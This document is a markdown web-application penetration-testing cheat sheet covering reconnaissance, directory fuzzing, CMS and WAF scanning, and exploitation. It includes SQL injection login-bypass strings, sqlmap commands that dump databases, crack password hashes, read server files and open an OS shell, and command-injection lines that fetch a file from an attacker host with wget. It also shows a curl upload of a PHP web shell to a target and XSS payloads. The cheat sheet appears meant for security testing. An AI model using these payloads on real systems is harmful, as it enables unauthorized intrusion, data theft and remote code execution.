# WebApp

## SQLInjections

Common Injections for Login Forms:
```
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1—
```

## domain-to-webapp
```
./webAppChecker www.example.com ./ouput_dir ./scope.txt
```

## SQLMAP

Automated scan
```
sqlmap -u http://example.com –forms –batch –crawl=10 –cookie=jsessionid=54321 –level=5 –risk=3
```

Targeted scan
```
sqlmap -u http://example.com -p PARAM –data=POSTDATA –cookie=COOKIE –level=3 –current-user –current-db –passwords –file-read=”/var/www/blah.php”
```

Scan url for union AND error based injection with MYSQL backend AND use a random user agent AND database dump
```
sqlmap -u “http://example.com/vuln.php?id=1” –dbms=mysql –tech=U –random-agent –dump
```

Find forms for injections
```
sqlmap -o -u “http://meh.com/form/” –forms
```

Dump + crack hashes for table users on database-name
```
sqlmap -o -u “http://meh/vuln-form” –forms -D database-name -T users –dump
```

Flushes the session
```
sqlmap --flush session
```

Attempts to exploit the “user” field using boolean technique
```
sqlmap -p user --technique=B
```

Capture a request via Burp Suite, save it to a file, and use this command to let sqlmap automate everything. Add –os-shell at the end to pop a shell if possible
```
sqlmap -r <captured request>
```

## Command Injection

File Traverse
```
website.com/file.php[?path=/]
```

Test HTTP options using curl
```
curl -vX OPTIONS [website]
```

Upload file using CURL to website with PUT option available
```
curl --upload-file shell.php --url http://192.168.218.139/test/shell.php --http1.0
```

Transfer file
```
?path=/; wget http://IPADDRESS:8000/FILENAME.EXTENTION;
```

Activate shell file
```
; php -f filelocation.php;
```

## Corsy
* Scans for all known misconfigurations in CORS implementations.

Standard scan
```
python3 corsy.py -u https://example.com
```
Scan URLs from a file
```
python3 corsy.py -i /path/urls.txt
```
Scan URLs from stdin
```
cat urls.txt | python3 corsy.py
```
Number of threads
```
python3 corsy.py -u https://example.com -t 20
```
Delay between requests
```
python3 corsy.py -u https://example.com -d 2
```
Export results to JSON
```
python3 corsy.py -i /path/urls.txt -o /path/output.json
```
Custom HTTP headers
```
python3 corsy.py -u https://example.com --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
```

## Garud
* Find injections points

Example Usage
```
garud -d hackerone.com
```
Exclude out of scope domains
```
echo test.hackerone.com > ossdomain.txt
garud -d hackerone.com -x ~/ossdomain.txt
```
With all flags
```
garud -d hackerone.com -j -s -x /home/oss.txt
```
Hide output in the terminal
```
garud -d hackerone.com -s
```
Store output in a single json file
```
garud -d hackerone.com -s -j
cd hackerone
cat output.json | jq
{
  "nuclei_critical": [],
  "vuln_crlf": [],
  "dalfox": [
    "[POC][V][GET][inATTR-double(3)-URL] http://subdomain.target.tld/hpp?pp=FUZZ%22onpointerout%3Dconfirm.call%28null%2C1%29+class%3Ddalfox+",
    ----------------------snip----------------------
    "subdomains": [
      "sub.target.tld",
      "tub.target.tld",
      "subdomain.target.tld"
  ],
  "vuln_xss": [
    "[POTENTIAL XSS] - http://subdomain.target.tld/hpp/?pp=%22%3E%2F%3E%3Csvg%2Fonload%3Dconfirm%28document.domain%29%3E ",
    "[POTENTIAL XSS] - http://subdomain.target.tld:80/hpp/?pp=%22%3E%2F%3E%3Csvg%2Fonload%3Dconfirm%28document.domain%29%3E ",
    "[POTENTIAL XSS] - http://subdomain.target.tld:80/hpp/index.php?pp=%22%3E%2F%3E%3Csvg%2Fonload%3Dconfirm%28document.domain%29%3E "
  ]
}
```

## Nmap

```sh
nmap -p 80 -vv --script=http-enum.nse,http-methods.nse,http-majordomo2-dir-traversal.nse,http-auth.nse,http-passwd.nse,http-php-version.nse,http-phpmyadmin-dir-traversal.nse,http-put.nse,http-apache-negotiation.nse,http-adobe-coldfusion-apsa1301.nse TARGET_IP
```

## Scan for cms

> Cmsmap

CMSmap is a CMS scanner that automates the process of detecting security flaws of the most popular CMSs.

```sh
cmsmap http://TARGET_IP:PORT
```

> Wpscan

The WPScan CLI tool is a black box WordPress security scanner

```sh
wpscan --url http://TARGET_IP:PORT
```

> Nikto

Nikto is an web server scanner which performs comprehensive tests against web servers for multiple

```sh
nikto -h http://TARGET_IP:PORT
```

> chameleon

```sh
chameleon --url http://TARGET_IP:PORT
```

> Whatweb

WhatWeb recognizes web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices.

```sh
whatweb -v -a 3 http://TARGET_IP:PORT
```

## WebSite Scanning

### Dico list

> Common

```list
/usr/share/dirbuster/wordlists/common.txt               - Size 13 KiB
/usr/share/skipfish/dictionaries/complete.wl            - Size 34 KiB
/usr/share/seclists/Discovery/Web-Content/common.txt    - Size 36 KiB
```

> Directory

```list
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt   - Size 244 KiB
/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt            - Size 2 MiB
/usr/share/dirbuster/wordlists/directory-list-2.3-big.txt               - Size 15 MiB
```

> File

```list
/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt         - 219 KiB
/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt          - 481 KiB
```

> Fuzz extension

```list
/usr/share/seclists/Discovery/Web-Content/web-extensions.txt            - Size 206 B
/usr/share/skipfish/dictionaries/extensions-only.wl                     - Size 1 KiB
/usr/share/seclists/Discovery/Web-Content/raft-small-extensions.txt     - Size 7 KiB
```

> Server Based

```list
/usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt                  - Size 4 KiB
/usr/share/seclists/Discovery/Web-Content/tomcat.txt                    - Size 2 KiB
/usr/share/seclists/Discovery/Web-Content/nginx.txt                     - Size 559 B
/usr/share/seclists/Discovery/Web-Content/apache.txt                    - Size 238 B
```

> Vhost

```list
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt       - Size 32 KiB
```

> Parameters

```list
/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt      - Size 18 KiB
```

### Commands

> Skipfish

```sh
skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -u http://TARGET_IP:Port
```

> Dirsearch

```sh
dirsearch -u http://TARGET_IP:Port -e php,asp
```

> Gobuster

```sh
gobuster dir -t 10 -x .php,.html -e -s 200,204,301,302,307 -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u http://TARGET_IP:Port
```

> feroxbuster

```sh
feroxbuster --url http://TARGET_IP:Port --depth 2
```

> Dirhunt

Dirhunt is a web crawler optimize for search and analyze directories. This tool can find interesting things if the server has the "index of" mode enabled.

```sh
dirhunt http://TARGET_IP:Port
```

### Check for backup files

Source: <https://github.com/mazen160/bfac.git>

```sh
bfac -u http://TARGET_IP:Port
```

> Exclude status-codes

```sh
bfac -u http://TARGET_IP:Port  --exclude-status-codes 301,999
```

> Random user agent

```sh
bfac -u http://TARGET_IP:Port -ra
```

## 403 Bypasser

```sh
403bypasser.py -u http://TARGET_IP:Port -d /DIRECTORY
403bypasser.py -u http://TARGET_IP:Port -D dirlist.txt
```

## Fuzzer

### Fuzz parameters - arjun

```sh
arjun -u http://TARGET_IP:Port
```

> Custom dico

```sh
arjun -u http://TARGET_IP:Port -f /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

### Wfuzz

```sh
wfuzz -c -z file,'/usr/share/wfuzz/wordlist/Injections/All_attack.txt' http://TARGET_IP:Port/index.php?page=FUZZ
```

> If site in https

```sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://TARGET_IP:PORT/index.php?page=FUZZ
```

## HeartBleed

```sh
sslscan TARGET_IP
```

```sh
testssl TARGET_IP
```

```sh
openssl s_client -connect TARGET_IP:443
```

### Proxy

```sh
Burp
```

## Zaproxy

```sh
zaproxy
```

## Check multiple page

The file hosts has multiple different url :
    www.test.com www.google.com ...

```sh
cat hosts |aquatone
```

## Detect WAF

> nmap

```sh
nmap -p80 --script http-waf-detect TARGET_IP
```

> wafw00f

```sh
wafw00f http://TARGET_IP
wafw00f https://TARGET_IP -v
```

## cURL

> File upload with cURL

```bash
curl -X PUT -d @FILE_TO_UPLOAD.txt http://TARGET_IP/FILE_TO_UPLOAD.txt -vv
```

> json

```bash
curl http://TARGET_IP -H 'Content-Type: application/json' -d '{ "username" : "root", "password" : "root" }'
```

> Cookie file

```bash
curl --cookie-jar cookies.txt http://TARGET_IP
```

> Follow redirection

```bash
curl -L http://TARGET_IP
```

> Only show the header

```bash

curl -I http://TARGET_IP
```

## Security.txt

This file is used to tell security researchers how they can disclose vulnerabilities for a website.  

> Path

```url
http://IP_ADDRESS/.well-known/security.txt
```

> Link

```url
https://securitytxt.org
```

## Index page

```url
http://IP_ADDRESS/robots.txt
http://IP_ADDRESS/sitemap.xml
http://IP_ADDRESS/crossdomain.xml
http://IP_ADDRESS/clientaccesspolicy.xml
```

## Discovery - Favicon

> Favicon database

<https://wiki.owasp.org/index.php/OWASP_favicon_database>

> Get the favicon hash

```bash
curl http://IP_ADDRESS/favicon.ico | md5sum
```

## OSINT

### Google dorks

| Filter   | Example            | Description                                                  |
| :------- | :----------------- | :----------------------------------------------------------- |
| site     | site:tryhackme.com | returns results only from the specified website address      |
| inurl    | inurl:admin        | returns results that have the specified word in the URL      |
| filetype | filetype:pdf       | returns results which are a particular file extension        |
| intitle  | intitle:admin      | returns results that contain the specified word in the title |

More info: <https://en.wikipedia.org/wiki/Google_hacking>

### Wayback Machine

<https://archive.org/web/>
